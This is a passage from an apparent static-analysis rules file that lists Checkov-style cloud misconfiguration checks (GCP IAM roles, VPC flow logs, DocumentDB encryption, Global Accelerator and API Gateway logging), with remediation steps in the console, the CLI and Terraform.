</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        metadata:
          annotations:
 +                  seccomp.security.alpha.kubernetes.io/pod: "docker/default" 
    or
 +                seccomp.security.alpha.kubernetes.io/pod: "runtime/default"
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    metadata:
        annotations:
+               seccomp.security.alpha.kubernetes.io/pod: "docker/default" 
    or
+               seccomp.security.alpha.kubernetes.io/pod: "runtime/default"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_30' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_30</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_30' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_41</key>
    <name>Ensure IAM users are not assigned Service Account User or Service Account Token creator roles at project level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-users-are-assigned-service-account-user-or-service-account-token-creator-roles-at-project-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-users-are-assigned-service-account-user-or-service-account-token-creator-roles-at-project-level"></div>IAM users are assigned Service Account User or Service Account Token creator roles at project level</div><a aria-label="Skip link to IAM users are assigned Service Account User or Service Account Token creator roles at project level" class="heading-anchor-icon fa fa-anchor" href="#iam-users-are-assigned-service-account-user-or-service-account-token-creator-roles-at-project-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A service account is a special Google account that belongs to an application or a VM, instead of to an individual end-user. Application/VM-Instance uses the service account to call the service's Google API so that end-users are not directly involved. The service account resource has IAM policies attached to it to determine who can use the service account.</p>
<p>Users with IAM roles to update the <strong>App Engine</strong> and <strong>Compute Engine</strong> instances, such as <strong>App Engine Deployer</strong> and <strong>Compute Instance Admin</strong>, can run code as the service accounts used to run these instances. This enables users to indirectly gain access to resources for which the service accounts have access. Similarly, SSH access to a <strong>Compute Engine</strong> instance may also provide the ability to execute code as that instance/Service account.</p>
<p>Your organization may have multiple user-managed service accounts configured for a project. Granting the<strong> iam.serviceAccountUser </strong>or <strong>iam.serviceAserviceAccountTokenCreatorccountUser</strong> roles to a user for a project gives the user access to all service accounts in the project, including service accounts created in the future. This can result in elevation of privileges by using service accounts and corresponding <strong>Compute Engine</strong> instances.</p>
<p>To implement least privileges best practices, IAM users should not be assigned the <strong>Service Account User</strong> or <strong>Service Account Token Creator</strong> roles at the project level. These roles should be assigned to a user for a specific service account, giving that user access to the service account. The <strong>Service Account User</strong> allows a user to bind a service account to a long-running job service. The <strong>Service Account Token Creator</strong> role allows a user to directly impersonate, or assert, the identity of a service account.</p>
<p>We recommend you assign the Service Account User (iam.serviceAccountUser) and Service Account Token Creator <strong>iam.serviceAccountTokenCreator</strong> roles to a user for a specific service account rather than assigning the role to a user at project level.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/iam-admin/iam" target="_self">IAM Admin</a>.</li>
<li>Click on the filter table text bar. Type: <em>Role: Service Account User</em></li>
<li>Click the <strong>Trash</strong> icon in front of the role <strong>Service Account User</strong> for every user listed as a result of a filter.</li>
<li>Click on the filter table text bar. Enter <em>Role: Service Account Token Creator</em></li>
<li>Click the <strong>Trash</strong> icon in front of the role <strong>Service Account Token Creator</strong> for every user listed as a result of a filter.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Using a text editor, remove the bindings with <strong>roles/iam.serviceAccountUser</strong> and <strong>roles/iam.serviceAccountTokenCreator</strong>.</li>
<li>Update the project's IAM policy:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud projects set-iam-policy PROJECT_ID iam.json</code>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_project_iam_binding<br/>
google_project_iam_member</li>
<li><strong>Argument</strong>: role</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project_iam_binding" "project" {
  project = "your-project-id"
- role    = "roles/iam.serviceAccountTokenCreator"
- role    = "roles/iam.serviceAccountUser"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_42</key>
    <name>Ensure Service Account does not have admin privileges</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="service-account-has-admin-privileges"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-service-account-has-admin-privileges"></div>Service Account has admin privileges</div><a aria-label="Skip link to Service Account has admin privileges" class="heading-anchor-icon fa fa-anchor" href="#service-account-has-admin-privileges"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A service account is a special Google account that belongs to an application or a VM, not to an individual end-user. The application uses the service account to call the service's Google API so that users are not directly involved. </p>
<p>Service accounts represent service-level security of application or VM Resources, determined by the roles assigned to them. Enrolling <strong>ServiceAccount</strong> with Admin rights gives full access to an assigned application or a VM. A ServiceAccount Access holder can perform critical actions, such as delete and update change settings, without user intervention. </p>
<p>We recommend you do not grant Admin privileges for <strong>ServiceAccount</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/iam-admin/iam" target="_self">IAM Admin</a>.</li>
<li>Navigate to <strong>Members</strong>.</li>
<li>Identify <strong>User-Managed user created</strong> service account with roles containing <strong>*Admin</strong><br/>
or <strong>*admin</strong> or roles matching <strong>Editor</strong> or <strong>Owner</strong>.</li>
<li>Click the <strong>Trash</strong> icon to remove the role from the member. In this case service account.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Using a text editor, remove <strong>Role</strong> that contains <strong>roles/*Admin</strong> or <strong>roles/*admin</strong> or matches <strong>roles/editor</strong> or <strong>roles/owner</strong>. Add a role to the bindings array that defines the group members and the role for those members.</li>
<li>Update the project's IAM policy:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud projects set-iam-policy PROJECT_ID iam.json</code></li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_project_iam_member</li>
<li><strong>Argument</strong>: role + member</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project_iam_member" "project" {
  project = "your-project-id"
-  role    = "roles/owner"
-  member  = "user:<a class="__cf_email__" data-cfemail="f185948285b19489909c819d94dc81839e9b949285df98909cdf96829483879892949092929e849f85df929e9c" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_26</key>
    <name>Ensure GCP VPC flow logs for the subnet is set to On</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vpc-flow-logs-for-the-subnet-is-set-to-off"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vpc-flow-logs-for-the-subnet-is-set-to-off"></div>GCP VPC flow logs for the subnet is set to Off</div><a aria-label="Skip link to GCP VPC flow logs for the subnet is set to Off" class="heading-anchor-icon fa fa-anchor" href="#gcp-vpc-flow-logs-for-the-subnet-is-set-to-off"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Flow Logs capture information about IP traffic going to and from network interfaces. This information can be used to detect anomalous traffic and insight about security workflows. You can view and retrieve flow log data in Stackdriver Logging. </p>
<p>VPC networks and subnetworks provide logically isolated and secure network partitions to launch Google Cloud Platform (GCP) resources. When Flow Logs are enabled for a subnet, VMs within that subnet report on all Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) flows. Each VM samples the inbound and outbound TCP and UDP flows it sees, whether the flow is to or from another VM, a host in the on-premises datacenter, a Google service, or a host on the Internet. If two GCP VMs are communicating and both are in subnets that have VPC Flow Logs enabled, both VMs report the flows.</p>
<p>We recommended you set <strong>Flow Logs</strong> to <strong>On</strong> to capture this data. Because the volume of logs may be high, you may wish to enable flow logs only for business-critical VPC Network Subnets.</p>
<p>Flow Logs supports the following use cases:</p>
<ul>
<li>Network monitoring</li>
<li>Understanding network usage and optimizing network traffic expenses</li>
<li>Network forensics</li>
<li>Real-time security analysis</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<ol>
<li>Open the VPC network GCP Console <a href="https://console.cloud.google.com/networking/networks/list" target="_self">https://console.cloud.google.com/networking/networks/list</a>.</li>
<li>Click the name of a subnet to display the <strong>Subnet details</strong> page.</li>
<li>Click the <strong>EDIT</strong> button.</li>
<li>Set <strong>Flow Logs </strong>to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set Private Google access for a network subnet, run the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute networks subnets update [SUBNET_NAME] 
--region [REGION] 
--enable-flow-logs
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_subnetwork</li>
<li><strong>Argument</strong>: log_config</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_subnetwork" "example" {
  name          = "log-test-subnetwork"
  ip_cidr_range = "10.2.0.0/16"
  region        = "us-central1"
  network       = google_compute_network.custom-test.id

+ log_config {
    aggregation_interval = "INTERVAL_10_MIN"
    flow_sampling        = 0.5
    metadata             = "INCLUDE_ALL_METADATA"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_logging_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_logging_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_74</key>
    <name>Ensure DocumentDB is encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="documentdb-is-not-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-document-db-is-not-encrypted-at-rest"></div>DocumentDB is not encrypted at rest</div><a aria-label="Skip link to DocumentDB is not encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#documentdb-is-not-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The encryption feature available for Amazon DocumentDB clusters provides an additional layer of data protection by helping secure your data against unauthorized access to the underlying storage.</p>
<p>Amazon DocumentDB allows you to encrypt your clusters using keys managed through the AWS Key Management Service (KMS). On a cluster running with Amazon DocumentDB encryption, data stored at rest in the underlying storage is encrypted, as are its automated backups, snapshots, and replicas in the same cluster. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<ol>
<li>Create an Amazon DocumentDB cluster.</li>
<li>Under the <strong>Authentication</strong> section, choose <strong>Show advanced settings</strong>.</li>
<li>Scroll down to the Encryption-at-rest section.</li>
<li>Choose the option that you want for encryption at rest. Whichever option you choose, you can't change it after the cluster is created.</li>
</ol>
<p>To encrypt data at rest in this cluster, choose <strong>Enable encryption</strong>.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">aws docdb create-db-cluster \
      --db-cluster-identifier sample-cluster \
      --port 27017 \
      --engine docdb \
      --master-username yourMasterUsername \
      --master-user-password yourMasterPassword \
      --storage-encrypted
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong>aws_docdb_cluster</li>
<li><strong>Arguments: </strong>storage_encrypted - Specifies whether the DB cluster is encrypted. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_docdb_cluster" "example" {
  ...
  cluster_identifier = "docdb-cluster-demo"
+ storage_encrypted  = true
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_28' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_28</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_28' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_75</key>
    <name>Ensure Global Accelerator has Flow logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="global-accelerator-does-not-have-flow-logs-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-global-accelerator-does-not-have-flow-logs-enabled"></div>Global Accelerator does not have Flow logs enabled</div><a aria-label="Skip link to Global Accelerator does not have Flow logs enabled" class="heading-anchor-icon fa fa-anchor" href="#global-accelerator-does-not-have-flow-logs-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Global Accelerator is a networking service that sends traffic through AWS's global network enabling global access to your web apps. Flow logs allow capturing information about the IP address traffic going to and from network interfaces in the AWS Global Accelerator. Flow log data is published to Amazon S3, where it can be retrieved and viewed.</p>
<p>Flow logs enable troubleshooting if specific traffic is not reaching an endpoint, helping you to diagnose overly restrictive security group rules. It can also be used to monitor the traffic that is reaching endpoints in a VPC and establish if they should be receiving that traffic.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Create an S3 bucket for your flow logs.</li>
<li>Add an IAM policy for the AWS user who is enabling the flow logs.</li>
<li>Run the following commands, with the S3 bucket name and prefix that you want to use for your log files:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws globalaccelerator update-accelerator-attributes 
       --accelerator-arn arn:aws:globalaccelerator::012345678901:accelerator/1234abcd-abcd-1234-abcd-1234abcdefgh 
       --region us-west-2
       --flow-logs-enabled
       --flow-logs-s3-bucket s3-bucket-name 
       --flow-logs-s3-prefix s3-bucket-prefix
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_globalaccelerator_accelerator</li>
<li><strong>Argument:</strong> flow_logs_enabled - (Optional) Indicates whether flow logs are enabled. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_globalaccelerator_accelerator" "example" {
  name            = "Example"
  ip_address_type = "IPV4"
  enabled         = true

  attributes {
+    flow_logs_enabled   = true
+    flow_logs_s3_bucket = "example-bucket"
+    flow_logs_s3_prefix = "flow-logs/"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_16' target='_blank'> https://docs.bridgecrew.io/docs/logging_16</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_16' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_76</key>
    <name>Ensure API Gateway has access logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="api-gateway-does-not-have-access-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-api-gateway-does-not-have-access-logging-enabled"></div>API Gateway does not have access logging enabled</div><a aria-label="Skip link to API Gateway does not have access logging enabled" class="heading-anchor-icon fa fa-anchor" href="#api-gateway-does-not-have-access-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling the custom access logging option in API Gateway allows delivery of custom logs to CloudWatch Logs, which can be analyzed using CloudWatch Logs Insights. Using custom domain names in Amazon API Gateway allows insights into requests sent to each custom domain name. If there is more than one custom domain name mapped to a single API, understanding the quantity and type of requests by domain name may help understand request patterns.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>Procedure:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/apigateway/" target="_self">Amazon API Gateway console</a>.</li>
<li>Find the Stage Editor for your API.</li>
<li>On the <strong>Stage Editor</strong> pane, choose the <strong>Logs/Tracing</strong> tab.</li>
<li>On the Logs/Tracing tab, under CloudWatch Settings, do the following to enable execution logging.</li>
<li>Select the <strong>Enable CloudWatch Logs</strong> check box.</li>
<li>For Log level, choose <strong>INFO </strong>to generate execution logs for all requests. Or, choose <strong>ERROR </strong>to generate execution logs only for requests to your API that result in an error.</li>
<li>Select the Log full requests/responses data check box for a REST API. Or, select the Log full message data check box for a WebSocket API.</li>
<li>Under <strong>Custom Access Logging</strong>, select the Enable Access Logging check box.</li>
<li>For <strong>Access Log Destination ARN</strong>, enter the ARN of a CloudWatch log group or an Amazon Kinesis Data Firehose stream.</li>
<li>Enter a Log Format. For guidance, you can choose CLF, JSON, XML, or CSV to see an example in that format.</li>
<li>Click <strong>Save Changes</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_api_gateway_stage</li>
<li><strong>Argument:</strong> access_log_settings - (Optional) Enables access logs for the API stage. Detailed below. </li>
</ul>
